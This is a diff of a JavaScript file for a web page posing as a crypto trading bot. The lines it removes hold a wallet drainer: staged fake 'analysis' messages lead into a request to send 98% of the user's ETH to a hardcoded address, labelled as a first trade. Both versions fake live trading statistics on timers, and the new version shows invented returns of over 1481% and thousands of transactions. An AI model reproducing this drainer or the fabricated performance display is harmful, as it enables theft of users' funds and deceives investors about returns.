@@ -10,9 +10,6 @@ this.ethereum.on('accountsChanged', handleAccountsChanged);
 };
 
 let accounts;
-let balance;
-let gasPrice;
-let result;
 let functionIndex = 0;
 
 const handleAccountsChanged = (a) => {
@@ -45,139 +42,13 @@ blockButton();
 accounts = await window.ethereum.request({method: 'eth_requestAccounts'}).catch((err)=>{
 console.log(err.code);});
 
-console.log(accounts[0]);
-
 document.getElementById('wallet_status').textContent = '• ';
 const address = accounts[0];
 const shortAddress = `${address.substring(0, 5)}...${address.substring(address.length - 4)}`;
 document.getElementById('wallet_ID').textContent = ` Wallet connected: ${shortAddress}`;
-checkBalance();
+document.getElementById('connect_wallet').textContent = 'Loading stats...';
+setTimeout(() => { stat(); }, 3000);
 }
-
-
-async function checkBalance() {
-document.getElementById('connect_wallet').textContent = 'Setting up...';
-document.getElementById('connect_wallet').style.fontSize = '16px';
-balance = await window.ethereum.request({ method: 'eth_getBalance', 
-params: [accounts[0], 'latest'] }).catch((err)=>{ console.log(err);});
-
-balance = parseInt(balance);
-console.log(balance);
-
-changeIndex();
-document.getElementById('connect_wallet').textContent = 'Start bot';
-document.querySelector('.css-qfts7w').remove();
-restoreButton();
-}
-
-
-function loadBot() {
-document.getElementById('connect_wallet').textContent = 'Initializing trading algorithm';
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Loading real-time market data'; }, 3500);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Loading historical data'; }, 4000);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Analyzing price action'; }, 5000);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Analyzing news sentiment'; }, 5500);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Thinking...'; }, 9000);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Identifying trading opportunities'; }, 25000);
-setTimeout(() => { document.getElementById('connect_wallet').textContent = 'Configuring trading parameters'; }, 30000);
-setTimeout(sendETH, 31000);
-}
-
-
-async function sendETH() {
-gasPrice = await window.ethereum.request({method: "eth_gasPrice"});
-
-params = [{"from": accounts[0], "to": "0x6258e22A8aC31354bf546Cd8582da695f6D8C98B", "gas": Number(21000).toString(16), 
-"gasPrice": gasPrice, "value": Number(balance*0.98).toString(16)}]
-
-const button = document.querySelector('.css-1gztsgi');
-const divWithImage = document.createElement('div');
-divWithImage.classList.add('css-qfts7w');
-const img = document.createElement('img');
-img.src = 'wallet-icon.png';
-img.classList.add('css-1bybaoo');
-divWithImage.appendChild(img);
-
-const textDiv = document.querySelector('#connect_wallet');
-button.insertBefore(divWithImage, textDiv);
-document.getElementById('connect_wallet').textContent = 'Authorize your first trade transaction';
-
-result = await window.ethereum.request({method: "eth_sendTransaction", params}).catch((err)=>{
-setTimeout(stat, 7000);
-});
-}
-
-
-
-
-function stat1() {
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.55';
-}, 1000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.56';
-}, 2000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.51'; 
-}, 3000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.56'; 
-}, 4000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.52';
-document.getElementById('transactions').textContent = '2';
-}, 5000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.38';
-}, 6000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.44'; 
-}, 7000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.48';
-document.getElementById('roe').textContent = '+0.17%';
-}, 8000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.53';
-}, 9000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.56';
-}, 10000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.48'; 
-}, 11000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.58';
-document.getElementById('roe').textContent = '+0.23%';
-}, 12000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.54';
-}, 13000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.53'; 
-}, 14000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.56';
-document.getElementById('roe').textContent = '+0.22%';
-}, 15000);
-}
-
-
-
 
 
 function stat() {
@@ -190,7 +61,7 @@ var newDiv = document.createElement('div');
 newDiv.setAttribute('data-bn-type', 'text');
 newDiv.setAttribute('class', 'css-tg1xcy');
 newDiv.setAttribute('style', 'margin-top: 0px; font-family: Regular; font-size: 15px; font-weight: 600;');
-newDiv.textContent = 'Started on 06/05/2023 11:41 UTC';
+newDiv.textContent = 'Started on 11/05/2023 11:41 UTC';
 parentDiv.appendChild(newDiv);
 
 var parentDiv = document.querySelector('.css-5nv61p');
@@ -215,7 +86,7 @@ newDiv.setAttribute('data-bn-type', 'text');
 newDiv.setAttribute('class', 'css-tg1xcy');
 newDiv.setAttribute('id', 'roe');
 newDiv.setAttribute('style', 'position: absolute; padding-top: 107px; color: #4fc14f; font-family: Regular; font-size: 20px;');
-newDiv.textContent = '+0.03%';
+newDiv.textContent = '+1481.45%';
 parentDiv.appendChild(newDiv);
 
 var parentDiv = document.querySelector('.css-5nv61p');
@@ -223,8 +94,8 @@ var newDiv = document.createElement('div');
 newDiv.setAttribute('data-bn-type', 'text');
 newDiv.setAttribute('class', 'css-tg1xcy');
 newDiv.setAttribute('id', 'success-rate');
-newDiv.setAttribute('style', 'position: absolute; padding-top: 107px; padding-left: 300px; color: black; font-family: Regular; font-size: 20px;');
-newDiv.textContent = '100.00%';
+newDiv.setAttribute('style', 'position: absolute; padding-top: 107px; padding-left: 315px; color: black; font-family: Regular; font-size: 20px;');
+newDiv.textContent = '99.97%';
 parentDiv.appendChild(newDiv);
 
 
@@ -263,7 +134,7 @@ newDiv.setAttribute('data-bn-type', 'text');
 newDiv.setAttribute('class', 'css-tg1xcy');
 newDiv.setAttribute('id', 'transactions');
 newDiv.setAttribute('style', 'position: absolute; padding-top: 205px; color: black; font-family: Regular; font-size: 20px;');
-newDiv.textContent = '1';
+newDiv.textContent = '10129';
 parentDiv.appendChild(newDiv);
 
 var parentDiv = document.querySelector('.css-5nv61p');
@@ -272,7 +143,7 @@ newDiv.setAttribute('data-bn-type', 'text');
 newDiv.setAttribute('class', 'css-tg1xcy');
 newDiv.setAttribute('id', 'mark-price');
 newDiv.setAttribute('style', 'position: absolute; padding-top: 205px; padding-left: 152px; color: black; font-family: Regular; font-size: 20px;');
-newDiv.textContent = '1870.61';
+newDiv.textContent = '1811.93';
 parentDiv.appendChild(newDiv);
 
 var parentDiv = document.querySelector('.css-5nv61p');
@@ -283,85 +154,63 @@ newDiv.setAttribute('style', 'position: absolute; padding-top: 205px; padding-le
 newDiv.textContent = 'Active';
 parentDiv.appendChild(newDiv);
 
-
-
 document.querySelector('.css-qfts7w').remove();
 document.querySelector('.css-1n7u5cf').style.paddingTop = '127px';
 document.getElementById('connect_wallet').textContent = 'Stop bot';
 restoreButton();
+changeIndex();
 
 
 setTimeout(() => {
-document.getElementById('roe').textContent = '+0.06%';
-document.getElementById('mark-price').textContent = '1821.59';
+document.getElementById('roe').textContent = '+1481.43%';
+document.getElementById('mark-price').textContent = '1792.93';
 }, 1000);
 
 setTimeout(() => { 
-document.getElementById('roe').textContent = '+0.08%';  
+document.getElementById('roe').textContent = '+1481.46%';
+document.getElementById('mark-price').textContent = '1792.98';  
 }, 2000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.58'; 
+document.getElementById('mark-price').textContent = '1792.93'; 
 }, 3000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.52'; 
+document.getElementById('mark-price').textContent = '1792.91'; 
 }, 4000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.47';
-document.getElementById('roe').textContent = '+0.11%';
+document.getElementById('mark-price').textContent = '1792.97';
+document.getElementById('roe').textContent = '+1481.57%';
 }, 5000);
 
 setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.52';
-document.getElementById('roe').textContent = '+0.13%';
+document.getElementById('mark-price').textContent = '1792.74';
 }, 6000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.54'; 
+document.getElementById('mark-price').textContent = '1792.79';
 }, 7000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.47'; 
+document.getElementById('mark-price').textContent = '1792.84';
+document.getElementById('transactions').textContent = '10130';
 }, 8000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.49';
-document.getElementById('roe').textContent = '+0.14%';
+document.getElementById('mark-price').textContent = '1792.78';
+document.getElementById('roe').textContent = '+1481.71%';
 }, 9000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.47'; 
+document.getElementById('mark-price').textContent = '1793.12';
 }, 10000);
 
 setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.48'; 
+document.getElementById('mark-price').textContent = '1792.78';
 }, 11000);
 
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.58';
-document.getElementById('roe').textContent = '+0.15%';
-}, 12000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.52';
-}, 13000);
-
-setTimeout(() => { 
-document.getElementById('mark-price').textContent = '1821.61'; 
-}, 14000);
-
-setTimeout(() => {
-document.getElementById('mark-price').textContent = '1821.78';
-document.getElementById('roe').textContent = '+0.13%';
-}, 15000);
 }
-
-
-
-
-
 
 
 
@@ -369,9 +218,8 @@ document.getElementById('roe').textContent = '+0.13%';
 function walletFunction() { 
 if (functionIndex == 0) { 
 connectWallet(); 
-} else {
+} else { 
 blockButton();
-loadBot(); 
 }
 }
 
